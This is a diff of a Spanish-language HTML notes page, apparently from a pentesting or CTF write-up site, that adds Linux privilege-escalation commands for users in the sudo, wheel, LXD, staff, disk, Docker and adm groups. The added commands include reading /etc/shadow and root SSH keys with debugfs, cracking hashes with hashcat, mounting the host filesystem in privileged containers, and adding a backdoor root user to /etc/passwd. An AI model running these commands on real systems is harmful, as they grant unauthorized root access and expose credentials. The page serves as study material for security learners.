@@ -54,7 +54,7 @@
 
           <div class="note-content">
             <p class="eyebrow">escalada de privilegios / linux / grupos</p>
-            <h2>Grupos Vulnerables</h2>
+            <h2>Enumerar Grupos</h2>
 
             <section class="code-card">
               <h3>Enumerar grupos</h3>
@@ -62,17 +62,113 @@
 groups</code></pre>
             </section>
 
-            <h2>Grupos a Revisar</h2>
-            <div class="tag-list">
-              <span>Sudo / Admin</span>
-              <span>Wheel</span>
-              <span>LXD / LXC</span>
-              <span>Staff</span>
-              <span>Disk</span>
-              <span>Docker</span>
-              <span>Adm</span>
-              <span>Internal</span>
-            </div>
+            <h2>Grupos Vulnerables</h2>
+
+            <section class="writeup-section">
+              <h3 class="vulnerable-group-title">Sudo / Admin</h3>
+              <div class="code-card">
+                <h3>Conectarnos como sudo o lanzar comandos como sudo con pkexec</h3>
+                <pre><code>sudo su
+pkexec "/bin/sh"</code></pre>
+              </div>
+            </section>
+
+            <section class="writeup-section">
+              <h3 class="vulnerable-group-title">Wheel</h3>
+              <div class="code-card">
+                <h3>Conectarnos como sudo conociendo las credenciales del usuario actual</h3>
+                <pre><code>sudo su
+pkexec "/bin/sh"</code></pre>
+              </div>
+            </section>
+
+            <section class="writeup-section">
+              <h3 class="vulnerable-group-title">LXD / LXC</h3>
+              <p>LXD es similar a Docker y permite escalar privilegios creando un contenedor LXD.</p>
+              <div class="code-card">
+                <h3>Iniciar daemon</h3>
+                <pre><code>lxd init</code></pre>
+              </div>
+              <div class="code-card">
+                <h3>Importar la imagen local con el alias ubuntutemp</h3>
+                <pre><code>lxc image import &lt;imag.tar&gt; --alias &lt;imag_name&gt;
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+lxc image list</code></pre>
+              </div>
+              <div class="code-card">
+                <h3>Iniciar la imagen ubuntutemp en el contenedor con alias privesc y con privilegios</h3>
+                <pre><code>lxc init &lt;imag_name&gt; &lt;container_name&gt; -c security.privileged=true
+lxc init ubuntutemp privesc -c security.privileged=true</code></pre>
+              </div>
+              <div class="code-card">
+                <h3>Montar el filesystem del host</h3>
+                <pre><code>lxc config device add &lt;container_name&gt; &lt;device_name&gt; disk source=/ path=/mnt/root recursive=true
+lxc config device add privesc host disk source=/ path=/mnt/root recursive=true</code></pre>
+              </div>
+              <div class="code-card">
+                <h3>Arrancar el contenedor y obtener shell</h3>
+                <pre><code>lxc start privesc
+lxc exec privesc /bin/sh</code></pre>
+              </div>
+            </section>
+
+            <section class="writeup-section">
+              <h3 class="vulnerable-group-title">Staff</h3>
+              <div class="code-card">
+                <h3>Permisos en /usr/local</h3>
+                <pre><code>ls -l /usr/local/bin # Aprovechar posibles Path Hijacking</code></pre>
+              </div>
+            </section>
+
+            <section class="writeup-section">
+              <h3 class="vulnerable-group-title">Disk</h3>
+              <p>Un atacante podría ingresar en <code>debugfs</code> y acceder a archivos sensibles dentro del sistema como <code>/etc/shadow</code>.</p>
+              <div class="code-card">
+                <h3>Entrar en debugfs en la partición</h3>
+                <pre><code># Para entrar en debugfs en la partición
+debugfs /dev/sda1
+
+# Podemos ver ficheros interesantes
+debugfs: cat /etc/shadow
+debugfs: cat /root/.ssh/id_rsa</code></pre>
+              </div>
+              <div class="code-card">
+                <h3>Cracking Shadow</h3>
+                <pre><code>hashcat -m 1800 shadow rockyou.txt</code></pre>
+              </div>
+            </section>
+
+            <section class="writeup-section">
+              <h3 class="vulnerable-group-title">Docker</h3>
+              <p>Un atacante podría montar el sistema de archivos del host original dentro de una instancia de Docker y modificar todo el sistema de archivos como root.</p>
+              <div class="code-card">
+                <h3>Docker</h3>
+                <pre><code># Listar imágenes de docker
+docker image
+
+# Shell en docker con el sistema de ficheros host montado
+docker run -it --rm -v /:/mnt &lt;imagename&gt; chroot /mnt bash
+
+# Añadir nuevo root
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' &gt;&gt; /etc/passwd</code></pre>
+              </div>
+            </section>
+
+            <section class="writeup-section">
+              <h3 class="vulnerable-group-title">ADM</h3>
+              <div class="code-card">
+                <h3>Permite leer /var/log</h3>
+                <pre><code># Aplica para log poisoning
+aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&amp;${C}[0m,g"
+
+grep -RE 'comm="su"|comm="sudo"' /var/log* 2&gt;/dev/null</code></pre>
+              </div>
+            </section>
+
+            <section class="writeup-section">
+              <h3 class="vulnerable-group-title">Internal</h3>
+              <p>Ejemplo práctico: <a href="/writeups/linux/openadmin.html">OpenAdmin</a>.</p>
+            </section>
 
             <h2>Tags</h2>
             <div class="tag-list">
